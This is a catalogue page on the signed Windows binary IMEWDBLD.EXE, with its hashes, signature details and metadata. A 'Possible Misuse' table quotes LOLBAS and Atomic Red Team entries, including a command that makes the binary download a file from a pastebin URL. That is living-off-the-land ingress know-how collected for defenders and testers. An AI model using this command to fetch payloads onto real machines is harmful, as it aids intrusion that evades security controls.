---
title: IMEWDBLD.EXE | Microsoft IME Open Extended Dictionary Module
excerpt: What is IMEWDBLD.EXE?
---

# IMEWDBLD.EXE 

* File Path: `C:\WINDOWS\system32\IME\SHARED\IMEWDBLD.EXE`
* Description: Microsoft IME Open Extended Dictionary Module

## Screenshot

![IMEWDBLD.EXE](screenshots/IMEWDBLD.EXE-CB30AD795C9B30E71EB1E596D18B7A21.png)

## Hashes

Type | Hash
-- | --
MD5 | `CB30AD795C9B30E71EB1E596D18B7A21`
SHA1 | `BFF2D944ABDB28691369B71D3BA630781518501C`
SHA256 | `60A1DCB12E65E0BD9E413AD48DF21A7753A90E7A60BD04F2865C55148818120F`
SHA384 | `F5BA656EFE77998AAD5FC3FD5A11A83CB53C7FB9242511F371C1B8ECB8D99255351BAE8F36E0F1841B8BF1B1765734D5`
SHA512 | `B3C535E27FC362365132ED2DA635B8EA557D29E29EAABD11C873FA9FE5AD7A949271C54D950FCFB9448FB7D7B2557922DAE3A197AFE01DE40A38BAF73FCCB947`
SSDEEP | `6144:58nhIq/0CaKkuYTVK1QsfjIbTGsBmR7Gs/UEVTppkX+:mnqgrfkuYTVcQsfezmR7Gs/r`

## Signature

* Status: Signature verified.
* Serial: `330000023241FB59996DCC4DFF000000000232`
* Thumbprint: `FF82BC38E1DA5E596DF374C53E3617F7EDA36B06`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: imewdbld.exe
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.18362.1 (WinBuild.160101.0800)
* Product Version: 10.0.18362.1
* Language: Language Neutral
* Legal Copyright:  Microsoft Corporation. All rights reserved.


## File Similarity (ssdeep match)

File | Score
-- | --
[C:\Windows\system32\IME\shared\IMEWDBLD.EXE](IMEWDBLD.EXE-8B8C8F73B4E96963DD9A6E760C5F77DD.md) | 43
[C:\Windows\system32\IME\SHARED\IMEWDBLD.EXE](IMEWDBLD.EXE-FBEE6DD18640B1575FF98D1EB3B51724.md) | 44
[C:\Windows\SysWOW64\IME\shared\IMEWDBLD.EXE](IMEWDBLD.EXE-0984D217E10D11B2DBB8CCD47CDF36BD.md) | 38
[C:\Windows\SysWOW64\IME\SHARED\IMEWDBLD.EXE](IMEWDBLD.EXE-40FBB367D0F83472C170359D6E3446A0.md) | 36
[C:\windows\SysWOW64\IME\SHARED\IMEWDBLD.EXE](IMEWDBLD.EXE-8EDFF2D1145341D7B23D012B29910539.md) | 32
[C:\Windows\SysWOW64\IME\SHARED\IMEWDBLD.EXE](IMEWDBLD.EXE-B840116C2D5805095F46CFD8ACBD0EB8.md) | 36
[C:\WINDOWS\SysWOW64\IME\SHARED\IMEWDBLD.EXE](IMEWDBLD.EXE-F042BFE4E2BE1EF592D9CFA14F8E6BD1.md) | 36

## Possible Misuse

*The following table contains possible examples of `IMEWDBLD.EXE` being misused. While `IMEWDBLD.EXE` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [IMEWDBLD.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml) | `Name: IMEWDBLD.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [IMEWDBLD.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml) | `- Command: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe https://pastebin.com/raw/tdyShwLw`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [IMEWDBLD.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml) | `Description: IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to %LocalAppData%\Microsoft\Windows\INetCache\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION> or %LocalAppData%\Microsoft\Windows\INetCache\IE\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [IMEWDBLD.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml) | `- Path: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe`{:.highlight .language-yaml} | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #17: Download a file with IMEWDBLD.exe [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #17: Download a file with IMEWDBLD.exe [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | - [Atomic Test #17 - Download a file with IMEWDBLD.exe](#atomic-test-17---download-a-file-with-imewdbldexe) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | ## Atomic Test #17 - Download a file with IMEWDBLD.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | $imewdbled = $env:SystemRoot + "\System32\IME\SHARED\IMEWDBLD.exe" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020-2021 Strontic.


